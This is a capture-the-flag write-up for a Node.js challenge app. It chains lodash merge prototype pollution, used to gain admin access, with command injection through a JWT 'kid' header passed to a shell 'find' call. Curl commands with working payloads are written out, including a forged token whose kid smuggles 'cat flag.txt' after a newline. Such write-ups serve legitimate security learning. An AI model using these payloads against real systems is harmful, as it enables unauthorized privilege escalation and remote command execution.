# Karafé Kid 

The application is a kind of math API for CTF, the source code is available.

![application](./img/application.png)

As we can see in the source code, there is a import of the `lodash` library and it uses the `merge` function.

```javascript
const _ = require("lodash");

[...]

app.post('/api/polynome', (req, res) => {
    console.log('Data:', req.body);
    let array = {
        a: 0,
        b: 0,
        c: 0
    };
    _.merge(array, req.body);
    let { a, b, c } = array;
```

There is a known vulnerability on this function and library called **Prototype Pollution**. We can modify and pollute the value of an object.

- https://github.com/kimmobrunfeldt/lodash-merge-pollution-example

We identify the admin route that required that the `user` object need to be admin : 

```javascript
    username: 'Ronald Rivest',
    spec: 'RSA',
    CheckifAdmin: false
};

[...]

app.get('/admin', (req, res) => {
    if (user.CheckIfAdmin) {
```

As there is a typo in the CheckIfAdmin condition (**CheckifAdmin** != **CheckIfAdmin**), we can pollute the object using the known vulnerability.


```bash
curl -ski -X POST 'http://0.0.0.0:3000/api/polynome' --header 'Content-Type: application/json' --data-raw '{"a": "2", "__proto__": { "CheckIfAdmin": true }}'
```

And thus access to the admin panel. 

![admin_panel](./img/admin_panel.png)


We have now a JWT as a cookie on the application.

![jwtio](./img/jwtio.png)

As we can see in the source code, the application fetch the KID before verifying the signature, and use the find command to reach the KID file 

```javascript
// fetch the KID file
let keyFile;
try {
    keyFile = execSync(`find ./keys -name ${kid}`).toString().trim();
} catch (error) {
    console.log('Failed to find key file:', error.message);
    return res.sendStatus(500);
}
```

But there is a whitelist regex based on UUIDs

```javascript
// check if only uuid are used
const allowedChars = /^[a-zA-Z0-9_\s\.-]+$/ 
if (!allowedChars.test(kid)) {
    console.log('Forbidden characters in kid.');
    return res.status(400).json({ message: 'Forbidden characters in kid.' });
}
```

We can notice that `\s` (whitespace) are accepted, we can perform a new line command injection.


```bash
curl -ski 'http://0.0.0.0:3000/admin' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFcbmNhdCBmbGFnLnR4dCJ9.eyJ1c2VybmFtZSI6IlJvbmFsZCBSaXZlc3QiLCJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjk3MTk3ODA2LCJleHAiOjE2OTcyMTIyMDZ9.0tG__bk90Y3jK5gng4a509AHF4LllMd5l8K5OwtRYho' | grep -Eo 'GH{(.*)}'
```